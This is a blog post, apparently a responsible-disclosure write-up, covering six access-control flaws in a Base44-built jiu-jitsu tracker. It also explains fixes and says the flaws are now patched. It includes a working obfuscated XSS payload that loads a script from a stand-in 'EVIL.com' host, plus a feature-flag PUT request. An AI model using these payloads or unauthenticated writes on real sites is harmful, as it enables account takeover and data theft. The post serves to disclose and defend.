---
title: "The Dangers of No-Code"
date: 2026-02-10
tags: ["no-code", "base44", "vibecoding", "idor", "xss", "web"]
summary: "A no-code BJJ tracker built on Base44 enforced all of its authorization in the browser. Here is the chain of six issues that let anyone with a browser read every user's data, deface the site, and take over accounts."
---

## Impact

8bitjj.com is a company that runs a Brazilian jiu-jitsu skill-tree tracker, an app for logging techniques and tracking your progress like a video game. I had a look at it before signing up and found a chain of vulnerabilities. Here is what they let me do.

With zero interaction, as an unauthenticated attacker:

- **Defacement.** Rewrite the homepage, footer, and copyright text to say anything.
- **Mass data theft.** Pull the full PII of every user on the site: emails, names, academies, and training data.
- **Destruction or ransom.** Wipe or lock database entries, deleting people's progress.

With a single click from a victim:

- **Full account takeover.**
- **Admin privilege escalation.**
- **Unlocking hidden and paid features for everyone, free.**

The technical detail on each is below.

---

## Target

Base44 exposes every data model in the app as a REST endpoint under `/api/apps/{app_id}/entities/...`, with the standard GET, POST, and PUT verbs. The React frontend is just one client talking to that API. Authorization lives in the UI, which decides what buttons to show, and the server enforces none of its own.

So any of these endpoints can be called directly, with a browser or curl, logged in or not. Open the network tab, copy a request, change it, send it again. Everywhere I call an endpoint "publicly writable" below, that is what I mean: I sent the request straight to it and the server accepted it.

That single gap produces the chain of six issues below. I have ordered them from most severe to least.

---

## Issue 1: God mode through SiteScript

**Endpoint:** `SiteScript`

This endpoint is meant for analytics snippets, the kind of thing where you paste in a Google Analytics tag. It takes raw JavaScript and injects it into the `<head>` of every page on the site, and it is publicly writable.

Because that code runs in the `<head>`, it loads before the app itself does, on every page, for every visitor. Whoever controls it controls the site: redirect all traffic somewhere hostile, drop a fake login overlay to harvest credentials, or run any other client-side code in every session. This is the worst of the six, which is why it leads.

---

## Issue 2: Stored XSS through blog posts

**Endpoint:** `BlogPost`

Blog posts are rendered with React's `dangerouslySetInnerHTML`, which drops the stored content into the page as live HTML instead of escaping it. Anyone can create a post without logging in, so I can store whatever markup I want.

The payload sits in the post and does nothing until someone opens it. When an authenticated user views the post, including an admin, it runs in their session and can lift their session token, which is enough to take over the account.

The proof of concept I used:

```html
<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vRVZJTC5jb20vIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEp onerror=eval(atob(this.id))>
```

The base64 string in the `id` attribute is a short loader that injects an external script tag. The broken `src` triggers `onerror`, which decodes the `id` and runs it.

---

## Issue 3: Anyone can flip the feature flags for everyone

**Endpoint:** `ProductReleaseControl`

This endpoint controls which gated features are switched on, things like the AI Coach and certain dashboards that are meant to sit behind a waitlist or a paywall. It is publicly writable.

One request flips them on for everyone:

```json
PUT { "public_enabled": true, "public_viewable": true }
```

After that the gated features are live for the whole world, and there is nothing left to charge for.

---

## Issue 4: The homepage and footer are publicly writable

**Endpoints:** `LandingPageContent`, `CopyrightConfig`

The static text for the homepage and footer is stored behind these two endpoints, and both accept unauthenticated writes.

So I can rewrite the homepage and footer to say anything, or repoint a link like Support at a page I control. Since it is served from the real domain, visitors have no reason to distrust it.

---

## Issue 5: You can edit other people's records

**Endpoints:** every `PUT` route, including `AcademyMembership`, `Subscription`, and `UserProfile`

None of the update routes check whether you own the record you are changing. The server validates the shape of the body and nothing else, so I can put any record's id in the request and it goes through.

That means setting someone else's subscription to `cancelled`, or bumping their belt to black, is a single PUT with their id in it. I confirmed it against `AcademyMembership` and `Subscription`. Any user can edit any other user's data.

---

## Issue 6: Every API response hands back the full database row

**Endpoint:** `GET /api/apps/{app_id}/entities/UserProfile`

Reads return the entire database row, not a trimmed public version of it. The UI might only show a name or a belt rank, but the JSON behind it carries every field stored for that record, and this holds for every entity, not just profiles.

So an unauthenticated script can walk the endpoint and collect the email, academy, and training history of every user. Here is a redacted slice of what comes back:

```json
[
  {
    "user_id": "691ab7c760a74bc...",
    "academy": "GBHQ",
    "created_by": "k**********@gmail.com",
    "is_sample": false
  },
  {
    "user_id": "69164da16d7c7...",
    "created_by": "g****************@gmail.com",
    "is_sample": false
  }
]
```

`created_by` is a real email address, and `is_sample` being `false` confirms these are real accounts rather than seed data.

---

## Why it broke this way

All six are the same mistake wearing different clothes: the generated code handles the normal flow and never adds an access-control layer behind it. Three gaps cover everything above.

- **No auth on writes.** The `PUT` and `POST` routes never check who is calling them. The implicit assumption is that if the frontend does not send a request, nobody will.
- **Authorization in the UI, not the API.** Privileged actions are hidden in the interface rather than enforced on the server, so calling the endpoint directly walks straight past them.
- **No input sanitization.** Stored content is rendered as raw HTML, which is where Issues 1 and 2 come from.

A no-code platform will build the happy path for you. It will not write your authorization model. That part has to be specified deliberately, because nothing in the generation step adds it on its own.

---

## How to fix it

Two passes. Triage first to close the worst of it, then fix the cause.

**First pass, stop the bleeding.**

- Sanitize rendered HTML. Run stored content through a library like DOMPurify before it reaches the DOM: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }}`. That keeps the formatting and drops the scripts. Closes Issues 1 and 2.
- Lock the data policies down. On Base44, or any BaaS with row level security, set update and delete to `auth.uid() == user_id`, and make the config tables (`SiteScript`, `LandingPageContent`, `ProductReleaseControl`) admin write only. Closes Issues 3, 4, and 5.

**Second pass, fix the cause.**

- Authenticate every write on the server. Stop trusting the frontend to gate anything. Each write route should check the session first and return 401 when there is not a valid one.
- Stop returning full rows. Add a public view that exposes only `{ name, belt, academy }` to non-admin reads, and never let `email`, `id`, or payment fields leave the server on a public request. Closes Issue 6.

---

## Disclosure

Reported privately to the owner and held back until it was fixed. Everything here has since been patched, which is why the post is up. The emails in the evidence stay redacted, since the whole point is that this data should not have been reachable in the first place.
